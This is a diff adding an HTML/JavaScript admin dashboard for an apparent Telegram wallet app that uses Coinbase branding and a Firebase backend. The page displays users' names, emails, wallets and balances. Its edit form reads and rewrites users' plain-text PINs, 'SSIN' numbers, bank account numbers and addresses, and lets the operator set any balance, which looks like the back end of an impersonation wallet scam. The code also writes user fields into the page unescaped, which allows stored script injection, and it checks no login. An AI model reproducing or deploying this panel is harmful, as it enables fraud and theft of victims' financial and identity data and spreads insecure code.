@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.7.2/css/all.css">
+  <link href="https://unpkg.com/boxicons@2.0.7/css/boxicons.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/css/iziModal.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      user-select: none;
+    }
+    .admin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px;
+      background-color: #111;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .admin-header img {
+      width: 35px;
+      height: 35px;
+      border-radius: 50%;
+      background-color: #fff;
+    }
+    .admin-header h1 {
+      font-size: 1rem;
+      margin: 0;
+    }
+    .container {
+      padding: 15px;
+    }
+    .table-container {
+      overflow-x: auto;
+      background-color: #222;
+      border-radius: 8px;
+      padding: 10px;
+    }
+    .table {
+      width: 100%;
+      font-size: 0.9rem;
+      color: #fff;
+    }
+    .table th, .table td {
+      padding: 10px;
+      text-align: left;
+      border-bottom: 1px solid #444;
+      white-space: nowrap;
+    }
+    .table th {
+      background-color: #333;
+    }
+    .table tbody tr:hover {
+      background-color: #2a2a2a;
+    }
+    .btn-edit, .btn-save, .btn-cancel {
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .btn-edit {
+      background-color: #0f7cdb;
+      color: #fff;
+      border: none;
+    }
+    .btn-edit:hover {
+      background-color: #0a5ca8;
+    }
+    .btn-save {
+      background-color: #444;
+      color: #fff;
+      border: none;
+    }
+    .btn-save:hover {
+      background-color: #666;
+    }
+    .btn-cancel {
+      background-color: #dc3545;
+      color: #fff;
+      border: none;
+    }
+    .btn-cancel:hover {
+      background-color: #b02a37;
+    }
+    .btn-save.loading, .btn-edit.loading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      pointer-events: none;
+    }
+    .wallet-form input, .wallet-form select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #444;
+      border-radius: 6px;
+      background-color: #333;
+      color: #fff;
+      font-size: 0.9rem;
+      outline: none;
+      margin-bottom: 10px;
+    }
+    .wallet-form input::placeholder {
+      color: #aaa;
+    }
+    .iziModal {
+      width: 90%;
+      max-width: 500px;
+      background: #222;
+      border-radius: 10px;
+    }
+    .dark-content {
+      padding: 20px;
+      color: #fff;
+    }
+    .close-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #444;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      transition: background-color 0.3s;
+      margin-top: 10px;
+    }
+    .close-btn:hover {
+      background-color: #666;
+    }
+    .search-bar {
+      width: 100%;
+      max-width: 400px;
+      margin: 15px 0;
+      padding: 10px;
+      border: 1px solid #444;
+      border-radius: 6px;
+      background-color: #333;
+      color: #fff;
+    }
+    @media (max-width: 576px) {
+      .admin-header h1 {
+        font-size: 0.9rem;
+      }
+      .table {
+        font-size: 0.75rem;
+      }
+      .table th, .table td {
+        padding: 8px;
+        min-width: 80px;
+      }
+      .btn-edit, .btn-save, .btn-cancel {
+        font-size: 0.75rem;
+        padding: 6px 10px;
+      }
+      .wallet-form input, .wallet-form select {
+        font-size: 0.8rem;
+      }
+      .iziModal {
+        width: 95%;
+      }
+      .dark-content {
+        font-size: 0.85rem;
+      }
+      .close-btn {
+        font-size: 0.8rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Admin Header -->
+  <div class="admin-header">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSDAaw4l8JGDm5-GkzwJuNd9m7vsxf9-5ZtXeN-akM1A82LJq7Re5MOYa0v-3xKpUd4NdM&usqp=CAU" alt="Coinbase">
+    <h1>Admin Dashboard</h1>
+    <button class="btn btn-sm btn-outline-light" id="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+  </div>
+
+  <!-- Main Content -->
+  <div class="container">
+    <input type="text" class="search-bar" id="search-users" placeholder="Search users by username or wallet...">
+    <div class="table-container">
+      <table class="table">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Username</th>
+            <th>Full Name</th>
+            <th>Email</th>
+            <th>Wallet</th>
+            <th>Balance</th>
+            <th>Referrals</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody id="users-table-body"></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Edit User Modal -->
+  <div id="edit-user-modal" class="iziModal" data-izimodal-title="Edit User">
+    <div class="dark-content">
+      <form class="wallet-form" id="edit-user-form">
+        <input type="hidden" id="edit-user-id">
+        <label for="edit-username" class="visually-hidden">Username</label>
+        <input type="text" id="edit-username" placeholder="Username" disabled>
+        <label for="edit-fullName" class="visually-hidden">Full Name</label>
+        <input type="text" id="edit-fullName" placeholder="Full Name" required>
+        <label for="edit-email" class="visually-hidden">Email</label>
+        <input type="email" id="edit-email" placeholder="Email (optional)">
+        <label for="edit-pin" class="visually-hidden">PIN</label>
+        <input type="password" id="edit-pin" placeholder="4 or 6-digit PIN" pattern="[0-9]{4}|[0-9]{6}" required>
+        <label for="edit-ssin" class="visually-hidden">SSIN</label>
+        <input type="text" id="edit-ssin" placeholder="SSIN (optional)">
+        <label for="edit-accountNumber" class="visually-hidden">Account Number</label>
+        <input type="text" id="edit-accountNumber" placeholder="Account Number (optional)">
+        <label for="edit-bankName" class="visually-hidden">Bank Name</label>
+        <input type="text" id="edit-bankName" placeholder="Bank Name (optional)">
+        <label for="edit-address" class="visually-hidden">Full Address</label>
+        <input type="text" id="edit-address" placeholder="Full Address (optional)">
+        <label for="edit-balance" class="visually-hidden">Balance</label>
+        <input type="number" id="edit-balance" placeholder="Balance" step="0.01" min="0" required>
+        <label for="edit-referrals" class="visually-hidden">Referrals</label>
+        <input type="number" id="edit-referrals" placeholder="Referrals" min="0" required>
+        <label for="edit-theme" class="visually-hidden">Theme</label>
+        <select id="edit-theme" class="form-select">
+          <option value="dark">Dark</option>
+          <option value="light">Light</option>
+        </select>
+        <label for="edit-currency" class="visually-hidden">Currency</label>
+        <select id="edit-currency" class="form-select">
+          <option value="USD">USD</option>
+          <option value="BTC">BTC</option>
+        </select>
+        <button type="submit" class="btn-save" id="submit-edit-user">Save</button>
+        <button type="button" class="btn-cancel" id="cancel-edit-user">Cancel</button>
+      </form>
+      <button class="close-btn">Close</button>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/izimodal/1.6.0/js/iziModal.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.12.0/toastify.min.js"></script>
+  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js"></script>
+  <script type="module" src="https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js"></script>
+
+  <script type="module">
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js';
+    import { getDatabase, ref, onValue, update } from 'https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js';
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyACrAgpR14dAu54vW45RKkcFM_wD-f2p-0",
+      authDomain: "coinbase-tgwallet.firebaseapp.com",
+      projectId: "coinbase-tgwallet",
+      databaseURL: "https://coinbase-tgwallet-default-rtdb.firebaseio.com",
+      storageBucket: "coinbase-tgwallet.firebasestorage.app",
+      messagingSenderId: "441804145305",
+      appId: "1:441804145305:web:1fb586667c0d648c342e08",
+      measurementId: "G-374F8YD4KV",
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const usersRef = ref(database, 'users');
+
+    // Expose Firebase functions globally
+    window.firebaseFunctions = { database, ref, onValue, update };
+
+    // Toastify wrapper
+    function showToast(message) {
+      if (typeof Toastify !== "undefined") {
+        Toastify({
+          text: message,
+          duration: 3000,
+          gravity: "top",
+          position: "right",
+          style: { background: "#333" },
+        }).showToast();
+      } else {
+        alert(message);
+        console.warn("Toastify not loaded, falling back to alert.");
+      }
+    }
+
+    $(document).ready(function() {
+      // Initialize modal
+      $("#edit-user-modal").iziModal({
+        background: '#222',
+        headerColor: '#444',
+        width: '90%',
+        maxWidth: 500,
+        radius: 10,
+        transitionIn: 'fadeInUp',
+        transitionOut: 'fadeOutDown',
+      });
+
+      // Fetch and display users
+      onValue(usersRef, (snapshot) => {
+        const users = snapshot.val();
+        const tbody = $("#users-table-body");
+        tbody.empty();
+        if (users) {
+          for (const userId in users) {
+            const user = users[userId];
+            // Log to debug username
+            console.log(`User ID: ${userId}, username: ${user.username}`);
+            const displayUsername = userId === "54321" ? "@Anonymous" : user.username ? `@${user.username}` : "@N/A";
+            tbody.append(`
+              <tr>
+                <td>${userId}</td>
+                <td>${displayUsername}</td>
+                <td>${user.fullName || "N/A"}</td>
+                <td>${user.email || "N/A"}</td>
+                <td>${user.wallet || "N/A"}</td>
+                <td>$${parseFloat(user.balance || 0).toFixed(2)}</td>
+                <td>${user.referrals || 0}</td>
+                <td><button class="btn-edit" data-user-id="${userId}"><i class="fas fa-edit"></i> Edit</button></td>
+              </tr>
+            `);
+          }
+        } else {
+          tbody.append('<tr><td colspan="8">No users found.</td></tr>');
+        }
+      }, (error) => {
+        console.error("Failed to fetch users:", error);
+        iziToast.error({ title: "Error", message: "Failed to fetch users: " + error.message, position: "topRight" });
+      });
+
+      // Search functionality
+      $("#search-users").on("input", function() {
+        const query = $(this).val().toLowerCase();
+        $("#users-table-body tr").each(function() {
+          const username = $(this).find("td:nth-child(2)").text().toLowerCase();
+          const wallet = $(this).find("td:nth-child(5)").text().toLowerCase();
+          $(this).toggle(username.includes(query) || wallet.includes(query));
+        });
+      });
+
+      // Edit user modal
+      $(document).on("click", ".btn-edit", function() {
+        const userId = $(this).data("user-id");
+        const userRef = ref(database, `users/${userId}`);
+        onValue(userRef, (snapshot) => {
+          const user = snapshot.val();
+          if (user) {
+            console.log(`Editing User ID: ${userId}, username: ${user.username}`);
+            $("#edit-user-id").val(userId);
+            $("#edit-username").val(user.username || "");
+            $("#edit-fullName").val(user.fullName || "");
+            $("#edit-email").val(user.email || "");
+            $("#edit-pin").val(user.pin || "");
+            $("#edit-ssin").val(user.ssin || "");
+            $("#edit-accountNumber").val(user.accountNumber || "");
+            $("#edit-bankName").val(user.bankName || "");
+            $("#edit-address").val(user.address || "");
+            $("#edit-balance").val(user.balance || 0);
+            $("#edit-referrals").val(user.referrals || 0);
+            $("#edit-theme").val(user.settings?.theme || "dark");
+            $("#edit-currency").val(user.settings?.currency || "USD");
+            $("#edit-user-modal").iziModal("open");
+          }
+        }, { onlyOnce: true });
+      });
+
+      // Save user edits
+      $("#edit-user-form").on("submit", function(e) {
+        e.preventDefault();
+        const submitButton = $("#submit-edit-user");
+        submitButton
+          .addClass("loading")
+          .prop("disabled", true)
+          .html('<i class="fas fa-spin-pulse fa-spinner"></i> Saving...');
+
+        const userId = $("#edit-user-id").val();
+        const userRef = ref(database, `users/${userId}`);
+        const fullName = $("#edit-fullName").val().trim();
+        const email = $("#edit-email").val().trim();
+        const pin = $("#edit-pin").val().trim();
+        const ssin = $("#edit-ssin").val().trim();
+        const accountNumber = $("#edit-accountNumber").val().trim();
+        const bankName = $("#edit-bankName").val().trim();
+        const address = $("#edit-address").val().trim();
+        const balance = parseFloat($("#edit-balance").val());
+        const referrals = parseInt($("#edit-referrals").val());
+        const theme = $("#edit-theme").val();
+        const currency = $("#edit-currency").val();
+
+        if (!fullName) {
+          iziToast.error({ title: "Error", message: "Full Name is required!", position: "topRight" });
+          submitButton.removeClass("loading").prop("disabled", false).text("Save");
+          return;
+        }
+        if (!/^[0-9]{4}$|^[0-9]{6}$/.test(pin)) {
+          iziToast.error({ title: "Error", message: "PIN must be 4 or 6 digits!", position: "topRight" });
+          submitButton.removeClass("loading").prop("disabled", false).text("Save");
+          return;
+        }
+        if (isNaN(balance) || balance < 0) {
+          iziToast.error({ title: "Error", message: "Invalid balance!", position: "topRight" });
+          submitButton.removeClass("loading").prop("disabled", false).text("Save");
+          return;
+        }
+        if (isNaN(referrals) || referrals < 0) {
+          iziToast.error({ title: "Error", message: "Invalid referrals count!", position: "topRight" });
+          submitButton.removeClass("loading").prop("disabled", false).text("Save");
+          return;
+        }
+
+        update(userRef, {
+          fullName,
+          email,
+          pin,
+          ssin,
+          accountNumber,
+          bankName,
+          address,
+          balance,
+          referrals,
+          settings: { theme, currency }
+        }).then(() => {
+          iziToast.success({ title: "Success", message: "User details updated!", position: "topRight" });
+          $("#edit-user-modal").iziModal("close");
+        }).catch((error) => {
+          iziToast.error({ title: "Error", message: "Failed to update user: " + error.message, position: "topRight" });
+        }).finally(() => {
+          submitButton.removeClass("loading").prop("disabled", false).text("Save");
+        });
+      });
+
+      // Cancel edit
+      $("#cancel-edit-user").on("click", function() {
+        $("#edit-user-modal").iziModal("close");
+      });
+
+      // Close modal
+      $(".close-btn").on("click", function() {
+        $("#edit-user-modal").iziModal("close");
+      });
+
+      // Logout
+      $("#logout-btn").on("click", function() {
+        window.Telegram.WebApp.close();
+      });
+    });
+  </script>
+</body>
+</html>
